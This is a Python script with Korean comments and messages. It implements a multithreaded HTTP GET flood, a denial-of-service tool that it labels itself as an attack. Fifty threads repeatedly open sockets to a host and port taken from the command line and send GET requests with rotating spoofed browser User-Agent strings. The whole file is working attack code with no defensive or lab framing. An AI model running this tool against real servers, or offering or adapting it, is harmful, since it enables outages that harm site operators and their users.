import socket
import threading
import random
import time
import sys
from rich.console import Console

# 콘솔 객체 초기화
console = Console()

# User-Agent 목록
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0"
]

# HTTP GET Flood 수행 함수
def http_flood(host, port, thread_id):
    while True:
        try:
            # 각 요청마다 새 소켓 생성
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            
            # 랜덤 User-Agent로 GET 요청 생성
            user_agent = random.choice(user_agents)
            request = f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml\r\n\r\n"
            
            # 요청 전송
            s.send(request.encode())
            console.print(f"[green][Thread {thread_id}][/green] 패킷 전송됨: {host}")
            
            # 소켓 종료
            s.shutdown(socket.SHUT_RDWR)
            s.close()
            
            # CPU 과부하 방지를 위한 짧은 딜레이
            time.sleep(0.1)
            
        except socket.error as e:
            console.print(f"[red][Thread {thread_id}][/red] 오류: {e}")
            time.sleep(1)  # 오류 발생 시 더 긴 대기 시간
            continue
        except Exception as e:
            console.print(f"[red][Thread {thread_id}][/red] 예상치 못한 오류: {e}")
            break

# 메인 함수
def main():
    if len(sys.argv) != 3:
        console.print("[red]사용법: python main.py <host> <port>[/red]")
        sys.exit(1)
        
    host = sys.argv[1]
    port = sys.argv[2]
    
    # 대상 연결 가능 여부 확인
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
        s.close()
    except socket.error:
        console.print(f"[red]오류: {host}:{port}에 연결할 수 없습니다[/red]")
        sys.exit(1)
    
    # 스레드 수
    thread_count = 50
    
    console.print(f"[yellow]{host}:{port}에 대한 HTTP GET flood 공격 시작 (스레드 {thread_count}개)[/yellow]")
    
    # 스레드 생성 및 시작
    for i in range(thread_count):
        t = threading.Thread(target=http_flood, args=(host, port, i))
        t.daemon = True
        t.start()
        console.print(f"[blue]스레드 {i} 시작됨[/blue]")
    
    # 메인 스레드 유지
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("[yellow]사용자에 의해 공격이 중지되었습니다[/yellow]")
        sys.exit(0)

if __name__ == "__main__":
    main()